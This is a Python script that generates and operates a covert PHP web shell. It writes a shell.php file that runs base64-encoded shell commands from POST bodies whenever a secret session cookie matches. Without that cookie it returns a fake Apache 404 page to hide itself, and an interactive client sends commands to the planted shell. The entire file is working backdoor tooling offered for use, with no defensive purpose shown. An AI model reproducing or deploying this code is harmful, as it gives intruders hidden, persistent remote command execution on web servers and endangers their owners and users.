#!/usr/bin/env python3
import argparse
from termcolor import colored
from base64 import b64encode
import random
import hashlib
import requests
import os
import sys

def parse_options():

	formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=50)
	parser = argparse.ArgumentParser(description='Web Shell', formatter_class=formatter)
	parser.add_argument("-c", "--connect", dest="connect", type=str, help="URL of web shell to connect to", required=False)
	parser.add_argument("-k", "--key", dest="key", type=str, help="Auth key for the generated web shell", required=False)
	parser.add_argument("-g", "--generate", dest="generate", help="Generate new key and webshell", action="store_true", required=False)
	args = parser.parse_args()
	return args

def generate_key(seed):

	alg = hashlib.sha256()
	alg.update(seed.encode("ascii"))
	key = b64encode(alg.hexdigest().encode("ascii"))
	return key.decode()

def generate_shell(key):

	shell = ['<?php',
		'if ($_COOKIE["session"] === "%s") {' % key,
		'  $command = file_get_contents("php://input");',
		'  echo shell_exec(base64_decode($command));',
		'  } else {',
		'    http_response_code(404);',
		'    echo "<html><head>";',
		'    echo "<title>404 Not Found</title>";',
		'    echo "</head><body>";',
		'    echo "<h1>Not Found</h1>";',
		'    echo "<p>The requested URL was not found on this server.</p>";',
		'    echo "<hr>";',
		'    echo "<address>Apache Server at localhost Port 80</address>";',
		'    echo "</body></html>";',
		'    die();',
		'  }',
		'?>']

	with open('./shell.php', 'w+') as file:
		for line in shell:
			file.write(line + '\n')
		file.close()
	print(colored('[+] ', "green") + 'Created new shell.php file.')

def connect(url, hmac):

	while True:

		cmd = str(input(colored("shell~$ ", "yellow", attrs=["bold"])))
		if cmd == 'exit' or cmd == 'quit':
			sys.exit(0)
		if cmd == 'clear':
			try:
				os.system('clear')
			except:
				os.system('cls')
		r = requests.post(url, data=b64encode(cmd.encode("ascii")), headers={'Cookie':'session=' + hmac}, verify=False)
		print(r.text)

def main(args):

	if args.connect:

		url = args.connect
		hmac = args.key
		connect(url, hmac)

	if args.generate:

		chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%^&*()-=_+[]{};':,./<>?"
		seed = ''.join(random.choice(chars) for i in range(50))
		print(colored('[+] ', 'blue') + 'Seed: ' + seed)
		key = generate_key(seed)
		print(colored('[+] ', 'blue') + 'Key: %s' % key)
		generate_shell(key)

if __name__ in "__main__":

	args = parse_options()
	main(args)
